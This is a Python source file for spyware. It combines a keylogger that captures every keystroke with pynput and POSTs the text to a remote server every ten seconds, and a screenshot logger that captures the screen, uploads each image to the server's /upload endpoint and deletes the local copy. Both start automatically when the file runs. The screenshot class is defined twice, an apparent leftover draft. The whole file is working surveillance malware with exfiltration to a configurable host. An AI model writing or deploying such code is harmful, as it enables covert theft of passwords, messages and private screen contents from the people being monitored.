from pynput import keyboard
import requests
import json
import threading
import pyautogui
import string
import random
from datetime import datetime
import os

class KeyLogger:

    def __init__(self, interval, port, server_ip):
        # global variable text where keystrokes are saved as a string which is sent to server
        self.server_ip = server_ip  
        self.port = port
        self.interval = interval
        self.text = ""
    
    def _send_post_request(self):
        payload = json.dumps({"keyboardData": self.text})
        try:
            requests.post(f"http://{self.server_ip}:{self.port}", 
                          data=payload, 
                          headers={"Content-Type" : "application/json"}
                          )
        except:
            print("Failed to send log!")

        finally:
            self.text = ""
            timer = threading.Timer(self.interval, self._send_post_request)
            timer.start()


    def _on_press(self, key):
        try:
            print(f"Pressed:{key}")
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace:
                self.text =  self.text [:-1]
            elif key == keyboard.Key.esc:
                print ("ESC pressed. Stopping Listener")
                return False # stops listener
            
            else:
                self.text += str(key).strip("'")
        except:
            pass

    def start(self):
        self._send_post_request()
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()

class ScreenshotLogger:
    def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
        self.interval = interval
        self.server_ip = server_ip
        self.port = port
 
    def _generate_name(self):
        rand = ''. join (random.choices(string.ascii_uppercase + string.digits, k=7))
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"screenshot_{rand}_{timestamp}.png"

    def take_screenshot(self):
        filename = self._generate_name()
        pyautogui.screenshot().save(filename)
        return filename
    
class ScreenshotLogger:
    def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
        self.interval = interval
        self.server_ip = server_ip
        self.port = port
 
    def _generate_name(self):
        rand = ''. join (random.choices(string.ascii_uppercase + string.digits, k=7))
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"screenshot_{rand}_{timestamp}.png"

    def take_screenshot(self):
        print("[*] Taking Screenshot...")
        filename = self._generate_name()
        pyautogui.screenshot().save(filename)
        print(f"[+] Saved Screenshot as file name {filename}")
        return filename
    
    def send_screenshot(self, image_path):
        try:
            with open(image_path, 'rb') as img:
                files = {'screenshot':img}
                response = requests.post(f"http://{self.server_ip}:{self.port}/upload", files=files)
                print(f"[Upload Success] {response.text}")

        except Exception as e:
            print(f"[Upload Failed] {e}")
        
        finally:
            os.remove(image_path)

    def start(self):
        def loop():
            img = self.take_screenshot()
            self.send_screenshot(img)
            threading.Timer(self.interval, loop).start()

        loop()

screenshot_logger = ScreenshotLogger(interval= 10)
screenshot_thread = threading.Thread(target = screenshot_logger.start)
screenshot_thread.daemon = True
screenshot_thread.start()

keylogger = KeyLogger(interval=10, port="8080", server_ip="127.0.0.1")
keylogger.start()



